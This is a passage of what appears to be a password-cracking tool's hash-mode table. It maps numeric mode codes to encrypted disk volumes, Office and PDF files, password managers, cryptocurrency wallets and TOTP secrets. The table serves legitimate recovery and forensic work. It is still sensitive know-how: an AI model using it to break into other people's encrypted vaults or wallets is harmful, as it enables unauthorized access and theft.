X  | 2 = PBKDF2-HMAC-SHA512                           | Full-Disk Encryption (FDE)
X  | 3 = PBKDF2-HMAC-Whirlpool                        | Full-Disk Encryption (FDE)
X  | 4 = PBKDF2-HMAC-RIPEMD160 + boot-mode            | Full-Disk Encryption (FDE)
Y | 1 = XTS  512 bit pure AES                        | Full-Disk Encryption (FDE)
Y | 1 = XTS  512 bit pure Serpent                    | Full-Disk Encryption (FDE)
Y | 1 = XTS  512 bit pure Twofish                    | Full-Disk Encryption (FDE)
Y | 2 = XTS 1024 bit pure AES                        | Full-Disk Encryption (FDE)
Y | 2 = XTS 1024 bit pure Serpent                    | Full-Disk Encryption (FDE)
Y | 2 = XTS 1024 bit pure Twofish                    | Full-Disk Encryption (FDE)
Y | 2 = XTS 1024 bit cascaded AES-Twofish            | Full-Disk Encryption (FDE)
Y | 2 = XTS 1024 bit cascaded Serpent-AES            | Full-Disk Encryption (FDE)
Y | 2 = XTS 1024 bit cascaded Twofish-Serpent        | Full-Disk Encryption (FDE)
Y | 3 = XTS 1536 bit all                             | Full-Disk Encryption (FDE)
8800 | Android FDE <= 4.3                               | Full-Disk Encryption (FDE)
12900 | Android FDE (Samsung DEK)                        | Full-Disk Encryption (FDE)
12200 | eCryptfs                                         | Full-Disk Encryption (FDE)
137XY | VeraCrypt                                        | Full-Disk Encryption (FDE)
X  | 1 = PBKDF2-HMAC-RIPEMD160                        | Full-Disk Encryption (FDE)
X  | 2 = PBKDF2-HMAC-SHA512                           | Full-Disk Encryption (FDE)
X  | 3 = PBKDF2-HMAC-Whirlpool                        | Full-Disk Encryption (FDE)
X  | 4 = PBKDF2-HMAC-RIPEMD160 + boot-mode            | Full-DiskEncryption (FDE)
X  | 5 = PBKDF2-HMAC-SHA256                           | Full-DiskEncryption (FDE)
X  | 6 = PBKDF2-HMAC-SHA256 + boot-mode               | Full-DiskEncryption (FDE)
X  | 7 = PBKDF2-HMAC-Streebog-512                     | Full-DiskEncryption (FDE)
Y | 1 = XTS  512 bit pure AES                        | Full-DiskEncryption (FDE)
Y | 1 = XTS  512 bit pure Serpent                    | Full-DiskEncryption (FDE)
Y | 1 = XTS  512 bit pure Twofish                    | Full-DiskEncryption (FDE)
Y | 1 = XTS  512 bit pure Camellia                   | Full-DiskEncryption (FDE)
Y | 1 = XTS  512 bit pure Kuznyechik                 | Full-DiskEncryption (FDE)
Y | 2 = XTS 1024 bit pure AES                        | Full-DiskEncryption (FDE)
Y | 2 = XTS 1024 bit pure Serpent                    | Full-DiskEncryption (FDE)
Y | 2 = XTS 1024 bit pure Twofish                    | Full-Disk Encryption (FDE)
Y | 2 = XTS 1024 bit pure Camellia                   | Full-DiskEncryption (FDE)
Y | 2 = XTS 1024 bit pure Kuznyechik                 | Full-DiskEncryption (FDE)
Y | 2 = XTS 1024 bit cascaded AES-Twofish            | Full-DiskEncryption (FDE)
Y | 2 = XTS 1024 bit cascaded Camellia-Kuznyechik    | Full-DiskEncryption (FDE)
Y | 2 = XTS 1024 bit cascaded Camellia-Serpent       | Full-DiskEncryption (FDE)
Y | 2 = XTS 1024 bit cascaded Kuznyechik-AES         | Full-DiskEncryption (FDE)
Y | 2 = XTS 1024 bit cascaded Kuznyechik-Twofish     | Full-DiskEncryption (FDE)
Y | 2 = XTS 1024 bit cascaded Serpent-AES            | Full-DiskEncryption (FDE)
Y | 2 = XTS 1024 bit cascaded Twofish-Serpent        | Full-DiskEncryption (FDE)
Y | 3 = XTS 1536 bit all                             | Full-DiskEncryption (FDE)
14600 | LUKS                                             | Full-Disk Encryption (FDE)
16700 | FileVault 2                                      | Full-Disk Encryption (FDE)
18300 | Apple File System (APFS)                         | Full-Disk Encryption (FDE)
9700 | MS Office <= 2003 \$0/\$1, MD5 + RC4               | Documents
9710 | MS Office <= 2003 \$0/\$1, MD5 + RC4, collider #1  | Documents
9720 | MS Office <= 2003 \$0/\$1, MD5 + RC4, collider #2  | Documents
9800 | MS Office <= 2003 \$3/\$4, SHA1 + RC4              | Documents
9810 | MS Office <= 2003 \$3, SHA1 + RC4, collider #1    | Documents
9820 | MS Office <= 2003 \$3, SHA1 + RC4, collider #2    | Documents
9400 | MS Office 2007                                   | Documents
9500 | MS Office 2010                                   | Documents
9600 | MS Office 2013                                   | Documents
10400 | PDF 1.1 - 1.3 (Acrobat 2 - 4)                    | Documents
10410 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #1       | Documents
10420 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #2       | Documents
10500 | PDF 1.4 - 1.6 (Acrobat 5 - 8)                    | Documents
10600 | PDF 1.7 Level 3 (Acrobat 9)                      | Documents
10700 | PDF 1.7 Level 8 (Acrobat 10 - 11)                | Documents
16200 | Apple Secure Notes                               | Documents
9000 | Password Safe v2                                 | Password Managers
5200 | Password Safe v3                                 | Password Managers
6800 | LastPass + LastPass sniffed                      | Password Managers
6600 | 1Password, agilekeychain                         | Password Managers
8200 | 1Password, cloudkeychain                         | Password Managers
11300 | Bitcoin/Litecoin wallet.dat                      | Password Managers
12700 | Blockchain, My Wallet                            | Password Managers
15200 | Blockchain, My Wallet, V2                        | Password Managers
16600 | Electrum Wallet (Salt-Type 1-3)                  | Password Managers
13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)      | Password Managers
15500 | JKS Java Key Store Private Keys (SHA1)           | Password Managers
15600 | Ethereum Wallet, PBKDF2-HMAC-SHA256              | Password Managers
15700 | Ethereum Wallet, SCRYPT                          | Password Managers
16300 | Ethereum Pre-Sale Wallet, PBKDF2-HMAC-SHA256     | Password Managers
16900 | Ansible Vault                                    | Password Managers
18100 | TOTP (HMAC-SHA1)                                 | One-Time Passwords
99999 | Plaintext                                        | Plaintext